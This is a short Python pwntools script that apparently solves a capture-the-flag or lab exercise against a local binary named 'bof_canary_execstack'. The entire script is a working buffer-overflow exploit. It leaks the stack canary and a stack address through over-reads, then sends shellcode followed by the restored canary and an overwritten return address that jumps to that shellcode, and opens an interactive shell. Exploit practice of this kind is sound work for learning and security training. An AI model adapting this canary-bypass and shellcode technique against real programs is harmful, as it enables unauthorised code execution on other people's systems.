from pwn import *

with open("shellcode", "rb") as f:
    shellcode = f.read()

r = process("./bof_canary_execstack")

msg = b"a"*0x39
r.sendline(str(len(msg)))
r.send(msg)
r.recvn(len(msg))
canary = r.recvn(7)
canary = b"\x00" + canary
info("canary: 0x{:016x}".format(u64(canary)))
r.clean()

msg = b"a"*0x58
r.sendline(str(len(msg)))
r.send(msg)
r.recvn(len(msg))
stack = u64(r.recvn(6) + b"\x00\x00")
stack -= 0x128
info("stack: 0x{:016x}".format(stack))
r.clean()

msg = shellcode
msg = msg.ljust(0x38, b"a")
msg += canary
msg += p64(0)
msg += p64(stack)

r.sendline(str(len(msg)))
r.send(msg)

r.sendline(b"0")

r.interactive()
